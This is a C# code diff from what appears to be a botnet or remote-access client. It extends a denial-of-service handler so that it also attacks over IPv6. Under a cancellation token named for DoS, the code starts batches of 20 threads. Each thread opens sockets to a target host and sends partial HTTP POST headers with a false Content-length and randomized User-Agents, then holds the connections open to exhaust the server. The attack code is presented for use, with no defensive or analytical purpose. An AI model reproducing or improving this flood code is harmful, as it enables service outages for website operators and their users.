@@ -30,25 +30,46 @@ namespace Miscellaneous.Handler
 
 
                 Debug.WriteLine($"Host:{host} Port:{port} Timeout:{timeout}");
-                while (!Packet.ctsDos.IsCancellationRequested && timespan > stopwatch.Elapsed && Connection.IsConnected)
+                while (!Packet.ctsDos.IsCancellationRequested && timespan > stopwatch.Elapsed && (Connection.IsConnected || Connection.IsConnectedV6))
                 {
                     for (int i = 0; i < 20; i++)
                     {
                         new Thread(() =>
                         {
-                            try
+                            if (Connection.IsConnected)
                             {
-                                Socket tcp = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                                tcp.Connect(host.ToString(), port);
-                                string post = $"POST / HTTP/1.1\r\nHost: {host} \r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: {userAgents[new Random().Next(userAgents.Length)]}\r\nContent-length: 5235\r\n\r\n";
-                                byte[] buffer = Encoding.UTF8.GetBytes(post);
-                                tcp.Send(buffer, 0, buffer.Length, SocketFlags.None);
-                                Thread.Sleep(2500);
-                                tcp.Dispose();
+                                try
+                                {
+                                    Socket tcp = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                                    tcp.Connect(host.ToString(), port);
+                                    string post = $"POST / HTTP/1.1\r\nHost: {host} \r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: {userAgents[new Random().Next(userAgents.Length)]}\r\nContent-length: 5235\r\n\r\n";
+                                    byte[] buffer = Encoding.UTF8.GetBytes(post);
+                                    tcp.Send(buffer, 0, buffer.Length, SocketFlags.None);
+                                    Thread.Sleep(2500);
+                                    tcp.Dispose();
+                                }
+                                catch
+                                {
+                                    //Console.WriteLine("Website may be down!");
+                                }
+
                             }
-                            catch
+                            if (Connection.IsConnectedV6)
                             {
-                                //Console.WriteLine("Website may be down!");
+                                try
+                                {
+                                    Socket tcpV6 = new Socket(AddressFamily.InterNetworkV6, SocketType.Stream, ProtocolType.Tcp);
+                                    tcpV6.Connect(host.ToString(), port);
+                                    string post = $"POST / HTTP/1.1\r\nHost: {host} \r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: {userAgents[new Random().Next(userAgents.Length)]}\r\nContent-length: 5235\r\n\r\n";
+                                    byte[] buffer = Encoding.UTF8.GetBytes(post);
+                                    tcpV6.Send(buffer, 0, buffer.Length, SocketFlags.None);
+                                    Thread.Sleep(2500);
+                                    tcpV6.Dispose();
+                                }
+                                catch
+                                {
+                                    //Console.WriteLine("Website may be down!");
+                                }
                             }
                         }).Start();
                     }
